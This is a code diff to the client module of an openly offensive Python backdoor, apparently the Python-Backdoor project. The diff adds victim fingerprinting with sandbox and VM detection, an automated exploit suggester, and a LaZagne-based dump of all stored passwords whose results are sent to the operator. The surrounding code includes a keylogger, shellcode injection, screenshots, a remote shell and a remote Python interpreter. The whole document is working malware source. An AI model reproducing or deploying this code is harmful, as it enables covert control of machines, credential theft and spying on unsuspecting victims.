@@ -6,10 +6,14 @@ https://github.com/xp4xbox/Python-Backdoor
 license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
 """
 import abc
+import copy
 import os
+import platform
+import socket
 import subprocess
 import sys
 import logging
+import ctypes
 import tempfile
 from io import BytesIO, StringIO
 
@@ -25,17 +29,41 @@ if platforms.OS in [platforms.DARWIN, platforms.LINUX]:
     from src.client.persistence.unix import Unix as Persistence
 else:
     import pyscreeze
+
     from src.client.persistence.windows import Windows as Persistence
+    from wes import main as run_wesng
 
 from src.definitions.commands import *
 from src.client.keylogger import Keylogger
 
-from lazagne.config.write_output import write_in_file, StandardOutput
-from lazagne.config.constant import constant
+from lazagne.config.write_output import write_in_file as lazagne_write_file
+from lazagne.config.write_output import StandardOutput as lazagne_SO
 from lazagne.config.run import run_lazagne
+from lazagne.config.constant import constant as lazagne_constant
 
 
-# abstract methods are the ones not cross compatible
+def get_info():
+    _hostname = socket.gethostname()
+    _platform = f"{platform.system()} {platform.release()}"
+
+    info = {"hostname": _hostname, "platform": _platform,
+            "architecture": platform.architecture(), "machine": platform.machine(), "processor": platform.processor(),
+            "x64_python": ctypes.sizeof(ctypes.c_voidp) == 8, "exec_path": os.path.realpath(sys.argv[0])}
+
+    if platforms.OS == platforms.WINDOWS:
+        p = Persistence()
+
+        info["username"] = os.environ["USERNAME"]
+        info["platform"] += " (Sandboxie) " if p.detect_sandboxie() else ""
+        info["platform"] += " (Virtual Machine) " if p.detect_vm() else ""
+        info["is_admin"] = bool(ctypes.windll.shell32.IsUserAnAdmin())
+        info["is_unix"] = False
+    else:
+        info["username"] = os.environ["USER"]
+        info["is_admin"] = bool(os.geteuid() == 0)
+        info["is_unix"] = True
+
+    return info
 
 
 class Control(metaclass=abc.ABCMeta):
@@ -43,10 +71,6 @@ class Control(metaclass=abc.ABCMeta):
         self.es = _es
         self.keylogger = Keylogger()
         self.disabled_processes = {}
-
-    @abc.abstractmethod
-    def get_info(self):
-        pass
 
     @abc.abstractmethod
     def inject_shellcode(self, buffer):
@@ -60,23 +84,104 @@ class Control(metaclass=abc.ABCMeta):
     def lock(self):
         pass
 
+    def get_vuln(self, exploit_only):
+        if platforms.OS == platforms.DARWIN:
+            self.es.send_json(ERROR, "Mac not supported.")
+            return
+
+        with tempfile.TemporaryDirectory() as tmp_dir:
+            if platforms.OS == platforms.WINDOWS:
+                _command_str = "systeminfo"
+
+            elif platforms.OS == platforms.LINUX:
+                path = f"{helper.get_submodule_path('linux-exploit-suggester')}/linux-exploit-suggester.sh"
+                new_path = f"{tmp_dir}/les.sh"
+
+                # https://stackoverflow.com/a/58363237
+                with open(new_path, "w") as new_file:
+                    with open(path, "r") as orig:
+                        for line in orig:
+                            line = line.replace('\r\n', '\n')
+                            new_file.write(line)
+
+                _command_str = f"chmod +x {new_path} && {new_path}"
+            else:
+                self.es.send_json(ERROR, "Platform not supported.")
+                return
+
+            _command = subprocess.Popen(_command_str, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                        stdin=subprocess.PIPE, shell=True)
+            output = helper.decode(_command.stdout.read() + _command.stderr.read())
+
+            if platforms.OS == platforms.WINDOWS:
+                systeminfo_file = f"{tmp_dir}/systeminfo.txt"
+
+                file = open(systeminfo_file, "w")
+                file.write(output)
+                file.close()
+
+                args = {'perform_update': True,
+                        'definitions': 'definitions.zip',
+                        'installedpatch': '',
+                        'usekbdate': False,
+                        'only_exploits': exploit_only,
+                        'hiddenvuln': '',
+                        'impacts': '',
+                        'severities': '',
+                        'outputfile': None,  # just read stdout
+                        'muc_lookup': False,
+                        'operating_system': None,
+                        'showcolor': False,
+                        'perform_wesupdate': False,
+                        'showversion': True,
+                        'missingpatches': None,
+                        'qfefile': None,
+                        'debugsupersedes': '',
+                        'verbosesupersedes': False,
+                        'systeminfo': systeminfo_file}
+
+                old_stdout = sys.stdout
+
+                # capture stdout for sending back to server
+                sys.stdout = stdout = StringIO()
+
+                try:
+                    run_wesng(args, tmp_dir)
+                except Exception as e:
+                    sys.stdout = old_stdout
+                    self.es.send_json(ERROR, f"Failed to retrieve: {e}")
+                    return
+
+                stdout.seek(0)
+                sys.stdout = old_stdout
+                rsp = stdout.read()
+            else:
+                rsp = output
+
+            self.es.sendall_json(SUCCESS, rsp)
+
     # laZagne password dump
     def password_dump(self, password=None):
         with tempfile.TemporaryDirectory() as tmp:
-            constant.st = StandardOutput()
+            # backup original lazagne 'constant'
+            orig_const = {}
+            for attribute in dir(lazagne_constant):
+                if attribute.startswith("__") and attribute.endswith("__"):
+                    continue
+                orig_const[attribute] = copy.deepcopy(getattr(lazagne_constant, attribute))
 
-            out = StringIO()
-
-            constant.output = 'txt'
-            constant.folder_name = tmp
+            lazagne_constant.st = lazagne_SO()
+            lazagne_constant.output = 'txt'
+            lazagne_constant.folder_name = tmp
 
             level = logging.getLogger(LOGGER_ID).level
 
             if level == logging.DEBUG:
-                constant.quiet_mode = False
+                lazagne_constant.quiet_mode = False
             else:
-                constant.quiet_mode = True
+                lazagne_constant.quiet_mode = True
 
+            out = StringIO()
             formatter = logging.Formatter(fmt='%(message)s')
             stream = logging.StreamHandler(out)
             stream.setFormatter(formatter)
@@ -87,10 +192,10 @@ class Control(metaclass=abc.ABCMeta):
                 r.setLevel(logging.CRITICAL)
             root.addHandler(stream)
 
-            constant.st.first_title()
+            lazagne_constant.st.first_title()
 
             if platforms.OS in [platforms.WINDOWS, platforms.DARWIN]:
-                constant.user_password = password
+                lazagne_constant.user_password = password
 
                 for _ in run_lazagne(category_selected="all", subcategories={password: password}, password=password):
                     pass
@@ -98,12 +203,17 @@ class Control(metaclass=abc.ABCMeta):
                 for _ in run_lazagne(category_selected="all", subcategories={}):
                     pass
 
-            write_in_file(constant.stdout_result)
+            lazagne_write_file(lazagne_constant.stdout_result)
+
+            # reset the lazagne 'constant'
+            for key in orig_const:
+                setattr(lazagne_constant, key, orig_const[key])
 
             # find file in the tmp dir and send it
             for it in os.scandir(tmp):
                 if not it.is_dir() and it.path.endswith(".txt"):
-                    self.receive(it.path)
+                    # send file using helper function
+                    self.send_file(it.path)
                     return
 
             self.es.send_json(ERROR, "Error getting results file.")
@@ -170,7 +280,7 @@ class Control(metaclass=abc.ABCMeta):
             image.save(_bytes, format="PNG")
             image_bytes = _bytes.getvalue()
 
-        self.es.sendall_json(SERVER_SCREENSHOT, image_bytes, len(image_bytes), is_bytes=True)
+        self.es.sendall_json(SUCCESS, image_bytes, len(image_bytes), is_bytes=True)
 
     def run_command(self, command):
         _command = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
@@ -187,7 +297,7 @@ class Control(metaclass=abc.ABCMeta):
         while True:
             data = self.es.recv_json()
 
-            if data["key"] == CLIENT_SHELL_CMD:
+            if data["key"] == SERVER_SHELL_CMD:
                 command_request = data["value"]
 
                 # check for windows chdir
@@ -219,11 +329,11 @@ class Control(metaclass=abc.ABCMeta):
 
                     self.es.sendall_json(SERVER_COMMAND_RSP, helper.decode(output))
 
-            elif data["key"] == CLIENT_SHELL_LEAVE:
+            elif data["key"] == SERVER_SHELL_LEAVE:
                 os.chdir(orig_dir)  # change directory back to original
                 break
 
-    def upload(self, buffer, file_path):
+    def download(self, buffer, file_path):
         output = self.es.recvall(buffer)
 
         try:
@@ -234,12 +344,12 @@ class Control(metaclass=abc.ABCMeta):
         except Exception as e:
             self.es.send_json(ERROR, f"Could not open file {e}")
 
-    def receive(self, file):
+    def send_file(self, file):
         try:
             with open(file, "rb") as _file:
                 data = _file.read()
 
-            self.es.sendall_json(SERVER_FILE_RECV, data, len(data), is_bytes=True)
+            self.es.sendall_json(SUCCESS, data, len(data), is_bytes=True)
         except Exception as e:
             self.es.send_json(ERROR, f"Error reading file {e}")
 
@@ -247,7 +357,7 @@ class Control(metaclass=abc.ABCMeta):
         while True:
             command = self.es.recv_json()
 
-            if command["key"] == CLIENT_PYTHON_INTERPRETER_CMD:
+            if command["key"] == SERVER_PYTHON_INTERPRETER_CMD:
                 old_stdout = sys.stdout
                 redirected_output = sys.stdout = StringIO()
 
@@ -269,5 +379,5 @@ class Control(metaclass=abc.ABCMeta):
                 else:
                     self.es.sendall_json(SERVER_PYTHON_INTERPRETER_RSP,
                                          helper.decode(redirected_output.getvalue().encode()))
-            elif command["key"] == CLIENT_PYTHON_INTERPRETER_LEAVE:
+            elif command["key"] == SERVER_PYTHON_INTERPRETER_LEAVE:
                 break
